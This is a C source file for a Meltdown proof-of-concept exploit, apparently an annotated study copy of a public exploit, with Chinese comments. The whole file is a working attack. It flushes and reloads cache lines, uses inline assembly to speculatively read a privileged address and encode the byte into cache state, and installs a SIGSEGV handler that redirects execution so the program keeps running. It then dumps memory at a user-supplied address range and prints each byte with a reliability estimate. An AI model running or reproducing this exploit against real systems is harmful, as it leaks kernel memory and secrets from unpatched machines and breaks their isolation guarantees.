#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>		//open
#include <ctype.h>		//isprint
#include <math.h>		//sqrt & pow
#include <sched.h>		//cpu
#include <x86intrin.h>	//cache & time

static int pagesize = 0, pagebits = 0;
static char *base = NULL;				//会分配数组基地址
static unsigned long accessTime[256];	//记录每个地址的访问时间，样本点
static signed int freq[256];		//“也许被cache“的频度

static int get_access_time(volatile char *addr){	//不能优化这个参数
	//源代码来自 https://github.com/paboldin/meltdown-exploi，测量地址addr的访问时间
	unsigned long long time1, time2;
	unsigned junk;
	time1 = __rdtscp(&junk);	//开始时间
	(void)*addr;				//访问addr地址，但是故意丢弃值，用于测量访问时间
	time2 = __rdtscp(&junk);	//结束时间
	return time2 - time1;
}

#define U10 1.281			//正态分布上0.1分位点
static void findCachedAddr(){
	unsigned long sum = 0;
	float ave = 0, var = 0, var2 = 0, min = 0, max = 0;

	for (int i = 0; i < 256; i ++) sum += (accessTime[i] = get_access_time(base + (i << pagebits)));		//Reload
	ave = sum / 256.0;		//平均值

	for (int i = 0; i < 256; i ++) var += pow(accessTime[i] - ave, 2) ;
	var2 = sqrt(var / 256.0);	//标准差

	//（样本总体 - 样本均值）/样本方差 应服从标准正态分布 N（0,1），取正态分布上0.1分位点U10,即未被cache的数据只有10%的概率小于我的下限而被当成cache的数据
	min = ave - U10 * var2;		//下限，小于这个则认为被cache
	max = ave + U10 * var2;		//上限，大于这个则认为不可能被cache

	for (int i = 0; i < 256; i ++){
		if(accessTime[i] < min) freq[i] ++; else		//小于下限，认为被cache
		if(accessTime[i] > max) freq[i] --;				//超过上限，认为不可能被cache
	}
}

#define CYCLES 1000				//进行1000重复：段错误、Flush+Reload、统计可能被cache的地址
static int readbyte(int fd, unsigned long addr){
	static char buf[256];
	memset(accessTime, 0, sizeof(accessTime));		//用于记录访问每页的时间
	memset(freq, 0, sizeof(freq));					//用于记录猜测每页被cache的频度

	for (int i = 0; i < CYCLES; i ++) {				//Flush + Reload原理
		if (pread(fd, buf, sizeof(buf), 0) < 0) {
			perror("pread");
			break;
		}

		for (int i = 0; i < 256; i ++) _mm_clflush(base + (i << pagebits));		//清空数组对应每页的cache，Flush

		_mm_mfence();		//来自于github，不能删去，否则会在重启电脑时发生异常？？

		__asm__ (			//进行攻击的代码，利用了动态多发射和流水线的特性
			"1:.rept 300\n\t"		//REPT的作用是把一组语句重复指定的次数
			"add $0x141, %%rax\n\t"	//这条指令执行300次，不太明白有什么用，测试处理器能乱序执行，保证数据被cache，或者占满add类型指令的发射槽和通路使得下面的指令流水发射？还是为了后面能跳转到这里
			".endr\n\t"

			"movzx (%[addr]), %%rax\n\t"	//读取addr地址中的内容保存在rax寄存器，越权访问一定会引发段错误
			"shl $12, %%rax\n\t"			//将rax × 4096，因为动态多发设这句话会执行，但是没有效果
			"jz 1b\n\t"						//跳转到1标号的位置，由于分支延迟技术下面的也会执行
			"movzx (%[target], %%rax, 1), %%rbx\n"	//未知数据乘以4096作为索引访问数组，不同的数据会使不同页面被cache

			"stop:\n"		//段错误处理函数会使程序跳到这里进行 Reload
			: : [target] "r" (base),[addr] "r" (addr): "rax", "rbx"
		);

		findCachedAddr();	//Reload
	}

	int mmax = freq[0], mi = 0;
	for (int i = 1; i < 256; i++) if(mmax < freq[i]) mmax = freq[mi = i];		//找到”猜测被cache“次数最多的数据地址
	return mi;
}

static void pin_cpu0()
{
	//源代码来自 https://github.com/paboldin/meltdown-exploi
	//Set the CPU affinity for a task,应该是只在一个cpu上执行程序，保证cpu亲和性（cache始终是这个cou的）
	cpu_set_t mask;

	/* PIN to CPU0 */
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}


static void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	//源代码来自 https://github.com/paboldin/meltdown-exploi
	//段错误信号处理函数，发生段错误（越权访问）时进入这个函数，RIP程序指针跳转到stop符号处
	extern char stop[];			//stop符号来自于__asm__中的标号，这里必须用extern char []，而用extern char *不行，没懂为什么
	//extern char *stop;		//gdb调试时会出现Cannot find bounds of current function，再继续的话会频繁发生段错误，一直在这里循环，无法继续

	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stop;
}

static void init(){
	//读取页的信息
	int tt = pagesize = sysconf(_SC_PAGE_SIZE);	//assert：cache块大小等于页大小
	while(tt >>= 1) pagebits ++;				//页大小是2的几次方

	//注册信号处理函数，源代码来自 https://github.com/paboldin/meltdown-exploi
	struct sigaction act = {
		.sa_sigaction = sigsegv,		//指定信号处理函数是sigsegv
		.sa_flags = SA_SIGINFO
	};
	sigaction(SIGSEGV, &act, NULL);		//给SIGSEGV段错误异常信号注册处理函数sigsegv，发生段错误时跳转到sigsegv函数

	//设置cpu亲和，不执行这个函数也没有什么问题
	pin_cpu0();

	//分配base数组空间，用于进行 Flush and Reload
	base = (char *)malloc(256 << pagebits);//8位，可能有0 ～ 255的256种取值
	memset(base, 1, 256 << pagebits);
}

int main(int argc, char **argv){

	//读入命令行参数
	if(argc < 3) {
		printf("Usage : %s [hexaddr] [length]\n", argv[0]);
		return -1;
	}

	unsigned long addr, length, end;
	sscanf(argv[1], "%lx", &addr);
	sscanf(argv[2], "%lx", &length);
	end = addr + length;

	//完成初始化工作
	init();

	//https://github.com/paboldin/meltdown-exploi
	int fd = open("/proc/version", O_RDONLY);
	if (fd < 0) {
		perror("open");
		return -1;
	}

	do{
		int c = readbyte(fd, addr);	//读addr地址处一个字节中的内容
		float perc = freq[c] * 100 / (float)CYCLES;
		printf("read %lx = %x %c\t  relibality = %.1f%%\n", addr, c, isprint(c) ? c : ' ', perc < 10 ? 0.0: perc);	//小于10%可能性就认为没有成功
	} while(++ addr < end);	//连续读length个字节

	close(fd);
	free(base);
	return 0;
}
